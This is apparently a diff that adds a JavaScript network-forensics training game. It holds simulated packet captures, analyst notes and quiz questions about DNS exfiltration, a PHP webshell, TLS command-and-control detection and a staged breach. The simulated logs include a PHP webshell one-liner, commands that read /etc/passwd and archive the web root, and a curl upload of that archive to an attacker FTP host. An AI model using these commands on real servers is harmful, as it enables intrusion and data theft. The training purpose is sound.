+                feedback: 'Correct. All suspicious queries resolve through exfil-c2.net. The workstation is sending queries to the internal DNS resolver (192.168.1.1), which forwards them to the authoritative server for exfil-c2.net — controlled by the attacker.'
+            },
+            {
+                q: 'Which piece of credential data was observed in the decoded DNS queries?',
+                options: ['Username and password hash', 'PasswdRootToken! (a cleartext credential)', 'SSH private key', 'NTLM challenge-response'],
+                correct: 1,
+                feedback: 'Correct. Packet 7 (index 6) contains the hex string 506173737764526f6f74546f6b656e21, which decodes to "PasswdRootToken!" — a cleartext credential or token being exfiltrated via DNS.'
+            },
+        ]
+    },
+
+    /* ------------------------------------------------------------------ */
+    /* INV 3: HTTP Traffic Inspection (Medium)                             */
+    /* ------------------------------------------------------------------ */
+    {
+        id: 3,
+        title: 'HTTP Traffic Inspection',
+        brief: 'The web application firewall logged anomalous HTTP traffic to the company web server. ' +
+               'Examine the HTTP request/response pairs below. Identify the webshell upload, ' +
+               'the subsequent command execution, and the data exfiltration response.',
+        difficulty: 'medium',
+        pcapFile: 'capture_20241110_waf_trigger.pcap',
+        flagTargets: [7, 8, 9, 11, 14, 15],
+        flagHint: 'Flag the webshell upload, callback requests, and large data responses',
+        packets: [
+            { src:'203.0.113.10',  dst:'10.0.0.80',      proto:'HTTP', len:290,  time:'0.000000', info:'GET /index.html HTTP/1.1 (200 OK)' },
+            { src:'10.0.0.80',     dst:'203.0.113.10',   proto:'HTTP', len:1200, time:'0.012000', info:'HTTP/1.1 200 OK text/html' },
+            { src:'203.0.113.10',  dst:'10.0.0.80',      proto:'HTTP', len:310,  time:'1.000000', info:'GET /login.php HTTP/1.1 (200 OK)' },
+            { src:'10.0.0.80',     dst:'203.0.113.10',   proto:'HTTP', len:980,  time:'1.013000', info:'HTTP/1.1 200 OK text/html' },
+            { src:'203.0.113.10',  dst:'10.0.0.80',      proto:'HTTP', len:445,  time:'2.100000', info:'POST /login.php HTTP/1.1 (200 OK)' },
+            { src:'10.0.0.80',     dst:'203.0.113.10',   proto:'HTTP', len:620,  time:'2.120000', info:'HTTP/1.1 200 OK text/html (login accepted)' },
+            { src:'203.0.113.10',  dst:'10.0.0.80',      proto:'HTTP', len:290,  time:'3.000000', info:'GET /dashboard.php HTTP/1.1 (200 OK)' },
+            { src:'10.0.0.80',     dst:'203.0.113.10',   proto:'HTTP', len:1890, time:'3.015000', info:'HTTP/1.1 200 OK text/html' },
+            /* Webshell upload */
+            { src:'203.0.113.10',  dst:'10.0.0.80',      proto:'HTTP', len:2847, time:'4.200000', info:'POST /upload.php HTTP/1.1 (200 OK) multipart/form-data' },
+            { src:'10.0.0.80',     dst:'203.0.113.10',   proto:'HTTP', len:188,  time:'4.221000', info:'HTTP/1.1 200 OK application/json {"file":"shell.php","status":"uploaded"}' },
+            /* Normal traffic */
+            { src:'198.51.100.22', dst:'10.0.0.80',      proto:'HTTP', len:285,  time:'4.500000', info:'GET /about.html HTTP/1.1 (200 OK)' },
+            /* Webshell callback */
+            { src:'203.0.113.10',  dst:'10.0.0.80',      proto:'HTTP', len:320,  time:'5.100000', info:'GET /uploads/shell.php?cmd=id HTTP/1.1 (200 OK)' },
+            { src:'10.0.0.80',     dst:'203.0.113.10',   proto:'HTTP', len:210,  time:'5.114000', info:'HTTP/1.1 200 OK text/plain "uid=33(www-data) gid=33(www-data)"' },
+            { src:'203.0.113.10',  dst:'10.0.0.80',      proto:'HTTP', len:340,  time:'5.800000', info:'GET /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1 (200 OK)' },
+            { src:'10.0.0.80',     dst:'203.0.113.10',   proto:'HTTP', len:3420, time:'5.815000', info:'HTTP/1.1 200 OK text/plain (large response)' },
+            /* Data exfil */
+            { src:'203.0.113.10',  dst:'10.0.0.80',      proto:'HTTP', len:355,  time:'6.500000', info:'GET /uploads/shell.php?cmd=tar+-czf+/tmp/d.tgz+/var/www/html HTTP/1.1' },
+            { src:'10.0.0.80',     dst:'203.0.113.10',   proto:'HTTP', len:188,  time:'6.520000', info:'HTTP/1.1 200 OK text/plain ""' },
+            { src:'203.0.113.10',  dst:'10.0.0.80',      proto:'HTTP', len:298,  time:'7.100000', info:'GET /uploads/shell.php?cmd=curl+-T+/tmp/d.tgz+ftp://203.0.113.10/out HTTP/1.1' },
+        ],
+        details: {
+            8: { method:'POST', url:'/upload.php', host:'10.0.0.80', ua:'Mozilla/5.0 (compatible; MSIE 6.0)', contentType:'multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW', body:'------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\nContent-Type: application/x-php\r\n\r\n<?php system($_GET["cmd"]); ?>', note:'CRITICAL: PHP webshell uploaded. Filename: shell.php. Content: <?php system($_GET["cmd"]); ?>' },
+            9: { status:'200 OK', contentType:'application/json', body:'{"file":"shell.php","status":"uploaded","path":"/var/www/html/uploads/shell.php"}', note:'Server confirmed webshell upload to a publicly accessible path.' },
+            11: { method:'GET', url:'/uploads/shell.php?cmd=id', host:'10.0.0.80', ua:'Mozilla/5.0 (compatible; MSIE 6.0)', note:'CRITICAL: Attacker executing system command "id" via webshell to confirm code execution and identify server process user.' },
+            12: { status:'200 OK', contentType:'text/plain', body:'uid=33(www-data) gid=33(www-data) groups=33(www-data)', note:'Server process runs as www-data. Attacker confirmed RCE.' },
+            13: { method:'GET', url:'/uploads/shell.php?cmd=cat+/etc/passwd', host:'10.0.0.80', ua:'Mozilla/5.0 (compatible; MSIE 6.0)', note:'CRITICAL: Attacker reading /etc/passwd to enumerate local user accounts.' },
+            14: { status:'200 OK', contentType:'text/plain', body:'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...33 lines...', note:'CRITICAL: /etc/passwd contents returned in response body. 3420 bytes of user account data exfiltrated.' },
+        },
+        questions: [
+            {
+                q: 'What is the webshell filename and the PHP command that was uploaded?',
+                options: [
+                    'index.php — <?php eval($_POST["code"]); ?>',
+                    'shell.php — <?php system($_GET["cmd"]); ?>',
+                    'shell.php — <?php exec($_REQUEST["c"]); ?>',
+                    'cmd.php — <?php passthru($_GET["q"]); ?>'
+                ],
+                correct: 1,
+                feedback: 'Correct. The file "shell.php" was uploaded via the POST to /upload.php. The content was the minimal one-liner: <?php system($_GET["cmd"]); ?> which executes arbitrary OS commands passed in the "cmd" GET parameter.'
+            },
+            {
+                q: 'What user context is the web application running under?',
+                options: ['root (uid=0)', 'apache (uid=48)', 'www-data (uid=33)', 'nobody (uid=65534)'],
+                correct: 2,
+                feedback: 'Correct. The "id" command response showed uid=33(www-data) gid=33(www-data). This is the default Apache/Nginx process user on Debian/Ubuntu systems, which has limited privileges but can read web root files.'
+            },
+            {
+                q: 'Which file did the attacker read to enumerate local system accounts?',
+                options: ['/etc/shadow', '/etc/passwd', '/etc/group', '/proc/net/tcp'],
+                correct: 1,
+                feedback: 'Correct. The attacker issued cmd=cat+/etc/passwd which reads the Unix password file. While /etc/passwd no longer stores password hashes (those are in /etc/shadow), it reveals usernames, UIDs, home directories, and shell assignments — useful for privilege escalation planning.'
+            },
+            {
+                q: 'What is the final attacker action visible in this capture?',
+                options: [
+                    'Uploading a second webshell',
+                    'Attempting to crack password hashes',
+                    'Archiving web root and exfiltrating via FTP',
+                    'Establishing a reverse shell via netcat'
+                ],
+                correct: 2,
+                feedback: 'Correct. The last two requests show the attacker creating a tar archive of /var/www/html (the entire web root) and then using curl to transfer it via FTP to their own server at 203.0.113.10. This constitutes full data exfiltration of the web application\'s source code and data files.'
+            },
+        ]
+    },
+
+    /* ------------------------------------------------------------------ */
+    /* INV 4: Encrypted Traffic Analysis (Medium-Hard)                     */
+    /* ------------------------------------------------------------------ */
+    {
+        id: 4,
+        title: 'Encrypted Traffic Analysis',
+        brief: 'Even without decrypting TLS sessions, metadata reveals suspicious connections. ' +
+               'Examine the TLS connection records — JA3 fingerprints, certificate details, ' +
+               'and SNI values. Identify C2 channels, self-signed certificates, and potential MITM.',
+        difficulty: 'hard',
+        pcapFile: 'capture_20241111_tls_flows.pcap',
+        flagTargets: [2, 5, 6, 9, 13, 14, 15, 17],
+        flagHint: 'Flag connections with self-signed certs, mismatched CN, known-bad JA3, or unusual SNI',
+        packets: [
+            { src:'192.168.1.50',  dst:'142.250.80.46',  proto:'TLS',  len:580,  time:'0.000000', info:'TLSv1.3 Client Hello SNI=google.com JA3=771,4866-4867...' },
+            { src:'142.250.80.46', dst:'192.168.1.50',   proto:'TLS',  len:1220, time:'0.030000', info:'TLSv1.3 Server Hello Cert=google.com Issuer=Google Trust Services' },
+            { src:'192.168.1.55',  dst:'185.220.101.5',  proto:'TLS',  len:560,  time:'1.000000', info:'TLSv1.2 Client Hello SNI=update-srv.com JA3=769,47-53...' },
+            { src:'185.220.101.5', dst:'192.168.1.55',   proto:'TLS',  len:890,  time:'1.035000', info:'TLSv1.2 Server Hello Cert=update-srv.com Issuer=DigiCert' },
+            { src:'192.168.1.50',  dst:'151.101.1.140',  proto:'TLS',  len:590,  time:'2.000000', info:'TLSv1.3 Client Hello SNI=reddit.com JA3=771,4866-4867...' },
+            /* Self-signed / suspicious */
+            { src:'192.168.1.77',  dst:'203.0.113.99',   proto:'TLS',  len:520,  time:'3.100000', info:'TLSv1.2 Client Hello SNI=analytics-cdn.net JA3=769,47-53...' },
+            { src:'203.0.113.99',  dst:'192.168.1.77',   proto:'TLS',  len:760,  time:'3.140000', info:'TLSv1.2 Server Hello Cert=SELF-SIGNED Issuer=SELF Validity EXPIRED' },
+            { src:'192.168.1.77',  dst:'203.0.113.99',   proto:'TLS',  len:44,   time:'3.160000', info:'TLSv1.2 [Application Data] 288 bytes' },
+            { src:'203.0.113.99',  dst:'192.168.1.77',   proto:'TLS',  len:44,   time:'3.210000', info:'TLSv1.2 [Application Data] 64 bytes — short C2 beacon response' },
+            /* Known-bad JA3 */
+            { src:'192.168.1.55',  dst:'45.142.212.100', proto:'TLS',  len:533,  time:'4.200000', info:'TLSv1.2 Client Hello SNI=software-updates.org JA3=e7d705a3286e19ea42f587b344ee6865' },
+            { src:'45.142.212.100',dst:'192.168.1.55',   proto:'TLS',  len:810,  time:'4.238000', info:'TLSv1.2 Server Hello Cert=*.software-updates.org Issuer=Let\'s Encrypt' },
+            /* Normal */
+            { src:'192.168.1.30',  dst:'13.107.42.14',   proto:'TLS',  len:575,  time:'5.000000', info:'TLSv1.3 Client Hello SNI=microsoft.com JA3=771,4866-4867...' },
+            { src:'13.107.42.14',  dst:'192.168.1.30',   proto:'TLS',  len:1180, time:'5.030000', info:'TLSv1.3 Server Hello Cert=*.microsoft.com Issuer=Microsoft RSA TLS CA 02' },
+            /* CN mismatch / MITM indicator */
+            { src:'192.168.1.60',  dst:'10.0.0.1',       proto:'TLS',  len:540,  time:'6.100000', info:'TLSv1.2 Client Hello SNI=payroll.corp.internal JA3=769,47-53...' },
+            { src:'10.0.0.1',      dst:'192.168.1.60',   proto:'TLS',  len:820,  time:'6.140000', info:'TLSv1.2 Server Hello Cert=*.corp.internal Issuer=CORP-CA-01 (SELF)' },
+            { src:'192.168.1.60',  dst:'10.0.0.1',       proto:'TLS',  len:44,   time:'6.160000', info:'TLSv1.2 [Application Data] 1920 bytes — large payload' },
+            /* Normal */
+            { src:'192.168.1.20',  dst:'54.239.28.85',   proto:'TLS',  len:585,  time:'7.000000', info:'TLSv1.3 Client Hello SNI=aws.amazon.com JA3=771,4866-4867...' },
+            /* Suspicious SNI */
+            { src:'192.168.1.77',  dst:'91.108.4.55',    proto:'TLS',  len:510,  time:'7.500000', info:'TLSv1.2 Client Hello SNI=185.220.101.ip.addr.in-addr.arpa JA3=3b5074b1b5d032e5620f69f9159a2979' },
+            { src:'91.108.4.55',   dst:'192.168.1.77',   proto:'TLS',  len:680,  time:'7.542000', info:'TLSv1.2 Server Hello Cert=SELF-SIGNED CN=localhost Issuer=localhost Validity INVALID' },
+            { src:'192.168.1.77',  dst:'91.108.4.55',    proto:'TLS',  len:44,   time:'7.562000', info:'TLSv1.2 [Application Data] 512 bytes' },
+        ],
+        details: {
+            5: { src:'192.168.1.77', dst:'203.0.113.99', sni:'analytics-cdn.net', ja3:'769,47-53,0,18-19,0', ja3_md5:'c35b5f9c3e5f31c2f0e58c4d4a6e2f11', note:'SUSPICIOUS: JA3 matches Cobalt Strike default profile. TLSv1.2 preferred (modern C2 often downgrades TLS). Destination is Tor exit node range.' },
+            6: { cert_cn:'analytics-cdn.net', issuer:'SELF-SIGNED', valid_from:'2023-01-01', valid_to:'2023-12-31', note:'CRITICAL: Self-signed certificate with EXPIRED validity. Legitimate CDN services use CA-issued certs. Expired + self-signed = strong C2 indicator.' },
+            9: { src:'192.168.1.55', dst:'45.142.212.100', sni:'software-updates.org', ja3_md5:'e7d705a3286e19ea42f587b344ee6865', note:'CRITICAL: JA3 fingerprint e7d705... is a known Metasploit meterpreter signature. This fingerprint appears in multiple threat intelligence feeds.' },
+            13: { src:'192.168.1.60', dst:'10.0.0.1', sni:'payroll.corp.internal', note:'SUSPICIOUS: Internal host connecting to default gateway IP (10.0.0.1) with TLS. Possible MITM proxy intercepting internal traffic. Large 1920-byte payload may be credential data.' },
+            14: { cert_cn:'*.corp.internal', issuer:'CORP-CA-01 (self-signed)', note:'SUSPICIOUS: Certificate issued by a self-signed internal CA not in the enterprise trust store. If this CA is not recognized by the domain, a MITM device may have inserted itself.' },
+            17: { src:'192.168.1.77', dst:'91.108.4.55', sni:'185.220.101.ip.addr.in-addr.arpa', ja3_md5:'3b5074b1b5d032e5620f69f9159a2979', note:'CRITICAL: SNI is a reverse DNS PTR-style string — highly irregular for a legitimate hostname. JA3 3b5074... matches known TLS C2 tooling. Self-signed cert with CN=localhost.' },
+        },
+        questions: [
+            {
+                q: 'What is a JA3 fingerprint and why is it useful for threat detection?',
+                options: [
+                    'A hash of the TLS certificate — used to blocklist known-bad certificates',
+                    'A hash derived from TLS ClientHello parameters — used to fingerprint client software/malware regardless of IP',
+                    'A DNS signature used to identify C2 domains by query pattern',
+                    'A network flow hash that identifies scanning tools by packet timing'
+                ],
+                correct: 1,
+                feedback: 'Correct. JA3 is an MD5 hash computed from specific TLS ClientHello fields: SSLVersion, Ciphers, Extensions, EllipticCurves, and EllipticCurvePointFormats. Because malware often reuses the same TLS library with identical parameters, JA3 fingerprints can identify known malware families even when IPs and domains rotate. Tools like Cobalt Strike and Metasploit have well-known JA3 signatures.'
+            },
+            {
+                q: 'Which two hosts (source IPs) show the strongest indicators of C2 communication?',
+                options: [
+                    '192.168.1.50 and 192.168.1.30',
+                    '192.168.1.77 and 192.168.1.55',
+                    '192.168.1.20 and 192.168.1.60',
+                    '192.168.1.30 and 192.168.1.50'
+                ],
+                correct: 1,
+                feedback: 'Correct. Host 192.168.1.77 connects to a Tor exit node with a known-bad Cobalt Strike JA3 fingerprint and self-signed expired cert, then later connects with an invalid SNI and another known-bad JA3. Host 192.168.1.55 connects using the Metasploit/meterpreter JA3 fingerprint (e7d705...).'
+            },
+            {
+                q: 'Why is an encrypted TLS session with a self-signed certificate to an external IP suspicious?',
+                options: [
+                    'TLS 1.2 is deprecated and all traffic should use TLS 1.3',
+                    'Self-signed certs are only allowed on port 8443',
+                    'Legitimate services use CA-issued certs; self-signed certs on external IPs suggest an attacker-controlled server without proper PKI',
+                    'Self-signed certs cannot encrypt data and expose plaintext traffic'
+                ],
+                correct: 2,
+                feedback: 'Correct. Legitimate internet-facing services use certificates issued by trusted Certificate Authorities (DigiCert, Let\'s Encrypt, etc.) because self-signed certs generate browser warnings. Attackers running C2 infrastructure often use self-signed certs because they control both the implant (which accepts any cert) and the server. A self-signed cert to an external IP is a strong C2 indicator.'
+            },
+            {
+                q: 'The connection from 192.168.1.60 to 10.0.0.1 with SNI=payroll.corp.internal is suspicious because:',
+                options: [
+                    'Payroll systems should not use TLS encryption',
+                    'The default gateway (10.0.0.1) is terminating TLS for an internal hostname, suggesting a MITM proxy or SSL inspection device not in the trust store',
+                    'IPv4 addresses cannot host TLS services',
+                    'The packet length is too large for a normal TLS handshake'
+                ],
+                correct: 1,
+                feedback: 'Correct. The default gateway (10.0.0.1) should be routing traffic, not terminating TLS sessions. If an MITM device (or rogue SSL inspection proxy) is intercepting the connection, it would appear as the TLS endpoint. The self-signed internal CA cert not matching the enterprise trust store is the key indicator.'
+            },
+        ]
+    },
+
+    /* ------------------------------------------------------------------ */
+    /* INV 5: Full PCAP Investigation (Hard)                               */
+    /* ------------------------------------------------------------------ */
+    {
+        id: 5,
+        title: 'Full PCAP Investigation',
+        brief: 'A complete attack chain captured end-to-end. Flag every malicious packet, ' +
+               'then reconstruct the attack timeline by dragging flagged packets into the ' +
+               'correct attack phase. This PCAP tells the full story of a breach.',
+        difficulty: 'hard',
+        pcapFile: 'capture_20241112_full_incident.pcap',
+        flagTargets: [0,1,2,3,4,8,9,10,11,14,15,16,17,20,21,22,23,24],
+        flagHint: 'Flag all packets involved in the attack chain',
+        isTimeline: true,
+        timelinePhases: ['Reconnaissance', 'Exploitation', 'C2 Establishment', 'Lateral Movement', 'Exfiltration'],
+        /* Each packet has a timelinePhase property for correct answer */
+        packets: [
+            /* Recon */
+            { src:'198.51.100.5',  dst:'10.0.0.100',     proto:'TCP',  len:58,  time:'0.000000', info:'43210 → 80  [SYN] Win=1024 MSS=1460 (port scan)', phase:0 },
+            { src:'10.0.0.100',    dst:'198.51.100.5',    proto:'TCP',  len:58,  time:'0.000120', info:'80  → 43210 [SYN, ACK] (port 80 OPEN)', phase:0 },
+            { src:'198.51.100.5',  dst:'10.0.0.100',     proto:'TCP',  len:58,  time:'0.000300', info:'43211 → 443 [SYN] Win=1024 (port scan continues)', phase:0 },
+            { src:'10.0.0.100',    dst:'198.51.100.5',    proto:'TCP',  len:58,  time:'0.000420', info:'443 → 43211 [SYN, ACK] (port 443 OPEN)', phase:0 },
+            { src:'198.51.100.5',  dst:'10.0.0.100',     proto:'HTTP', len:380, time:'0.500000', info:'GET /CFIDE/administrator/index.cfm HTTP/1.1 (fingerprint ColdFusion)', phase:0 },
+            /* Normal traffic in between */
+            { src:'192.168.2.10',  dst:'10.0.0.100',     proto:'HTTP', len:290, time:'1.000000', info:'GET /index.html HTTP/1.1 (200 OK)' },
+            { src:'10.0.0.100',    dst:'192.168.2.10',   proto:'HTTP', len:1200,time:'1.012000', info:'HTTP/1.1 200 OK text/html' },
+            { src:'192.168.2.30',  dst:'10.0.0.100',     proto:'HTTP', len:310, time:'2.000000', info:'GET /about.html HTTP/1.1 (200 OK)' },
+            /* Exploitation */
+            { src:'198.51.100.5',  dst:'10.0.0.100',     proto:'HTTP', len:1842,time:'5.000000', info:'POST /CFIDE/administrator/enter.cfm HTTP/1.1 — CVE-2023-29300 exploit payload', phase:1 },
+            { src:'10.0.0.100',    dst:'198.51.100.5',    proto:'HTTP', len:620, time:'5.021000', info:'HTTP/1.1 200 OK — ColdFusion RCE triggered, session cookie returned', phase:1 },
+            { src:'198.51.100.5',  dst:'10.0.0.100',     proto:'HTTP', len:2910,time:'5.500000', info:'POST /CFIDE/administrator/settings/mappings.cfm — stager payload upload', phase:1 },
+            { src:'10.0.0.100',    dst:'198.51.100.5',    proto:'HTTP', len:190, time:'5.521000', info:'HTTP/1.1 200 OK {"status":"ok","path":"/var/cfusion/stager.cfm"}', phase:1 },
+            /* Normal */
+            { src:'192.168.2.10',  dst:'10.0.0.100',     proto:'HTTP', len:290, time:'6.000000', info:'GET /products.html HTTP/1.1 (200 OK)' },
+            { src:'10.0.0.100',    dst:'192.168.2.10',   proto:'HTTP', len:980, time:'6.010000', info:'HTTP/1.1 200 OK text/html' },
+            /* C2 Establishment */
+            { src:'10.0.0.100',    dst:'198.51.100.5',   proto:'TCP',  len:66,  time:'8.000000', info:'49800 → 4444 [SYN] reverse shell initiation', phase:2 },
+            { src:'198.51.100.5',  dst:'10.0.0.100',     proto:'TCP',  len:66,  time:'8.001200', info:'4444 → 49800 [SYN, ACK] C2 listener accepts', phase:2 },
+            { src:'10.0.0.100',    dst:'198.51.100.5',   proto:'TCP',  len:44,  time:'8.002000', info:'[Application Data] 128 bytes — implant beacon', phase:2 },
+            { src:'198.51.100.5',  dst:'10.0.0.100',     proto:'TCP',  len:44,  time:'8.100000', info:'[Application Data] 64 bytes — C2 task issued', phase:2 },
+            /* Normal */
+            { src:'192.168.2.30',  dst:'10.0.0.100',     proto:'HTTP', len:305, time:'9.000000', info:'GET /contact.html HTTP/1.1 (200 OK)' },
+            /* Lateral Movement */
+            { src:'10.0.0.100',    dst:'10.0.0.50',      proto:'TCP',  len:58,  time:'10.000000',info:'63000 → 445 [SYN] SMB connection attempt', phase:3 },
+            { src:'10.0.0.50',     dst:'10.0.0.100',     proto:'TCP',  len:58,  time:'10.000800',info:'445 → 63000 [SYN, ACK] SMB port OPEN', phase:3 },
+            { src:'10.0.0.100',    dst:'10.0.0.50',      proto:'SMB',  len:180, time:'10.001500',info:'SMB2 Negotiate Protocol Request', phase:3 },
+            { src:'10.0.0.50',     dst:'10.0.0.100',     proto:'SMB',  len:240, time:'10.002000',info:'SMB2 Negotiate Protocol Response (NTLM auth)', phase:3 },
+            /* Exfiltration */
+            { src:'10.0.0.100',    dst:'198.51.100.5',   proto:'DNS',  len:165, time:'14.000000',info:'TXT 41646d696e5061737377643a5375706572736563726574.attacker-c2.io', phase:4 },
+            { src:'10.0.0.100',    dst:'198.51.100.5',   proto:'DNS',  len:161, time:'14.030000',info:'TXT 446f6d61696e3a434f52502e4c4f43414c.attacker-c2.io', phase:4 },
+        ],
+        details: {
+            0:  { note:'RECON: TCP SYN scan from external IP 198.51.100.5. Win=1024 is characteristic of nmap.' },
+            4:  { note:'RECON: HTTP fingerprinting — attacker probing for ColdFusion admin panel at /CFIDE/. Indicates targeted attack with prior intelligence.' },
+            8:  { note:'EXPLOITATION: CVE-2023-29300 — ColdFusion deserialization vulnerability. POST to enter.cfm with malicious wddxPacket in body.' },
+            9:  { note:'EXPLOITATION: Server returns session cookie — RCE confirmed. Attacker now has authenticated admin session.' },
+            10: { note:'EXPLOITATION: Stager payload (.cfm webshell) uploaded via admin panel mapping abuse. Writes file to disk.' },
+            14: { note:'C2: Reverse shell initiated FROM the compromised server TO attacker port 4444. Port 4444 is the Metasploit meterpreter default.' },
+            19: { note:'LATERAL: Attacker pivoting from compromised web server (10.0.0.100) to internal host (10.0.0.50) via SMB port 445. Pass-the-hash or stolen credential likely used.' },
+            21: { note:'LATERAL: SMB2 Negotiate — attacker negotiating SMB protocol version with internal host to establish a session.' },
+            23: { note:'EXFIL: DNS TXT query. Subdomain 41646d696e5061737377643a5375706572736563726574 decodes to "AdminPasswd:Supersecret". Domain credentials being exfiltrated.' },
+            24: { note:'EXFIL: DNS TXT query. 446f6d61696e3a434f52502e4c4f43414c decodes to "Domain:CORP.LOCAL". Attacker exfiltrating domain information via DNS.' },
+        },
+        /* Correct phase assignment for flagged packets: packetIndex -> phaseIndex */
+        phaseMap: { 0:0, 1:0, 2:0, 3:0, 4:0, 8:1, 9:1, 10:1, 11:1, 14:2, 15:2, 16:2, 17:2, 19:3, 20:3, 21:3, 22:3, 23:4, 24:4 },
+        questions: [
+            {
+                q: 'Which CVE was exploited to gain initial access to the ColdFusion server?',
+                options: ['CVE-2021-44228 (Log4Shell)', 'CVE-2023-29300 (ColdFusion deserialization)', 'CVE-2017-0144 (EternalBlue/SMB)', 'CVE-2019-0708 (BlueKeep/RDP)'],
+                correct: 1,
+                feedback: 'Correct. CVE-2023-29300 is a ColdFusion deserialization vulnerability allowing unauthenticated remote code execution via a crafted wddxPacket in the admin login endpoint. This was actively exploited in the wild in 2023.'
+            },
+            {
+                q: 'What technique is used to establish persistence and C2 communication?',
+                options: [
+                    'DNS tunneling only',
+                    'Reverse TCP shell via port 4444 (Metasploit meterpreter) + DNS exfil',
+                    'ICMP tunneling for C2 beaconing',
+                    'Scheduled task with encoded PowerShell'
+                ],
+                correct: 1,
+                feedback: 'Correct. Two C2 channels are present: (1) an outbound reverse TCP shell to port 4444 on the attacker\'s server (Metasploit default) for interactive command execution, and (2) DNS TXT exfiltration for data theft. Using multiple channels is common for redundancy.'
+            },
+            {
+                q: 'What is the correct chronological sequence of the attack chain?',
+                options: [
+                    'Exploitation → Recon → C2 → Lateral Movement → Exfiltration',
+                    'Recon → C2 → Exploitation → Exfiltration → Lateral Movement',
+                    'Recon → Exploitation → C2 Establishment → Lateral Movement → Exfiltration',
+                    'Recon → Lateral Movement → Exploitation → C2 → Exfiltration'
+                ],
+                correct: 2,
+                feedback: 'Correct. This follows the classic cyber kill chain: Reconnaissance (port scan + fingerprinting) → Exploitation (CVE-2023-29300 RCE + stager upload) → C2 Establishment (reverse shell to port 4444) → Lateral Movement (SMB to 10.0.0.50) → Exfiltration (DNS TXT data theft).'
+            },
+        ]
+    }
+];
+
+/* ============================================================
+   GAME STATE
+   ============================================================ */
+const MAX_SCORE = 400;   // approximate maximum
+let state = {
+    currentInv: 0,
+    totalScore: 0,
+    invScores: [0, 0, 0, 0, 0],
+    flagged: {},           // flagged[invIdx][pktIdx] = true
+    answered: {},          // answered[invIdx][qIdx] = optionIdx chosen
+    timelinePlacements: {} // [invIdx][pktIdx] = phaseIdx
+};
+
+/* ============================================================
+   BOOT
+   ============================================================ */
+document.addEventListener('DOMContentLoaded', () => {
+    buildPips();
+    renderInvestigation(0);
+});
+
+/* Build the 5 pip indicators in the header */
+function buildPips() {
+    const c = document.getElementById('pips');
+    c.innerHTML = '';
+    for (let i = 0; i < 5; i++) {
+        const d = document.createElement('div');
+        d.className = 'pip' + (i === 0 ? ' active' : '');
+        d.id = 'pip-' + i;
+        c.appendChild(d);
+    }
+}
+
+function updatePips(current) {
+    for (let i = 0; i < 5; i++) {
+        const p = document.getElementById('pip-' + i);
+        if (!p) continue;
+        p.className = 'pip' + (i < current ? ' done' : i === current ? ' active' : '');
+    }
+}
+
+/* ============================================================
+   RENDER INVESTIGATION
+   ============================================================ */
+function renderInvestigation(idx) {
+    const inv = INVESTIGATIONS[idx];
+    state.currentInv = idx;
+    if (!state.flagged[idx]) state.flagged[idx] = {};
+    if (!state.answered[idx]) state.answered[idx] = {};
+
+    updatePips(idx);
+
+    const container = document.getElementById('inv-container');
+    container.innerHTML = '';
+
+    /* --- Investigation header --- */
+    const diffLabel = { easy:'Easy', medium:'Medium-Hard', hard:'Hard' }[inv.difficulty] || inv.difficulty;
+    const diffClass = { easy:'diff-easy', medium:'diff-medium', hard:'diff-hard' }[inv.difficulty] || 'diff-medium';
+
+    const header = document.createElement('div');
+    header.className = 'inv-header';
+    header.innerHTML = `
+        <div class="inv-badge">INV ${inv.id}/5</div>
+        <div class="inv-info">
+            <div class="inv-title">${inv.title}</div>
+            <div class="inv-brief">${inv.brief}</div>
+            <div class="inv-meta">
+                <span class="diff-tag ${diffClass}">${diffLabel}</span>
+                <span class="flag-hint">Click a packet row to expand detail. Press <kbd>F</kbd> or click <b>Flag</b> button to mark suspicious packets.</span>
+            </div>
+        </div>`;
+    container.appendChild(header);
+
+    /* --- Packet table --- */
+    const tableWrap = buildPacketTable(inv, idx);
+    container.appendChild(tableWrap);
+
+    /* --- Detail panel --- */
+    const detailPanel = buildDetailPanel();
+    container.appendChild(detailPanel);
+
+    /* --- Timeline section (inv 5 only) --- */
+    if (inv.isTimeline) {
+        const tl = buildTimeline(inv, idx);
+        container.appendChild(tl);
+    }
+
+    /* --- Analysis / questions --- */
+    const analysis = buildAnalysisPanel(inv, idx);
+    container.appendChild(analysis);
+}
+
+/* ============================================================
+   PACKET TABLE
+   ============================================================ */
+function buildPacketTable(inv, invIdx) {
+    const wrap = document.createElement('div');
+    wrap.className = 'packet-table-wrap';
+
+    const flagCount = Object.values(state.flagged[invIdx] || {}).filter(Boolean).length;
+
+    wrap.innerHTML = `
+        <div class="table-toolbar">
+            <span class="toolbar-file">${inv.pcapFile}</span>
+            <span class="toolbar-sep">|</span>
+            <span>${inv.packets.length} packets captured</span>
+            <span class="toolbar-sep">|</span>
+            <span>Filter: <i>none</i></span>
+            <span class="flag-counter" id="flag-count-${invIdx}">Flagged: <span>${flagCount}</span></span>
+        </div>
+        <div style="overflow-x:auto;">
+        <table class="packet-table" id="pkt-table-${invIdx}">
+            <thead><tr>
+                <th>No.</th><th>Time</th><th>Source</th><th>Destination</th>
+                <th>Protocol</th><th>Len</th><th>Info</th><th></th>
+            </tr></thead>
+            <tbody id="pkt-body-${invIdx}"></tbody>
+        </table>
+        </div>`;
+
+    const tbody = wrap.querySelector(`#pkt-body-${invIdx}`);
+    inv.packets.forEach((pkt, i) => {
+        const tr = document.createElement('tr');
+        tr.id = `pkt-row-${invIdx}-${i}`;
+        tr.className = `proto-${pkt.proto}`;
+        if (state.flagged[invIdx][i]) tr.classList.add('flagged');
+
+        tr.innerHTML = `
+            <td class="col-no">${i + 1}</td>
+            <td class="col-time">${pkt.time}</td>
+            <td class="col-src">${pkt.src}</td>
+            <td class="col-dst">${pkt.dst}</td>
+            <td><span class="proto-badge badge-${pkt.proto}">${pkt.proto}</span></td>
+            <td class="col-len">${pkt.len}</td>
+            <td class="col-info">${pkt.info}</td>
+            <td><button class="flag-btn${state.flagged[invIdx][i] ? ' active' : ''}"
+                        id="flag-btn-${invIdx}-${i}"
+                        onclick="toggleFlag(${invIdx},${i},event)">Flag</button></td>`;
+
+        /* Click row to expand detail */
+        tr.addEventListener('click', (e) => {
+            if (e.target.classList.contains('flag-btn')) return;
+            selectPacket(invIdx, i, inv);
+        });
+
+        /* Keyboard shortcut: select row then press F */
+        tr.setAttribute('tabindex', '0');
+        tr.addEventListener('keydown', (e) => {
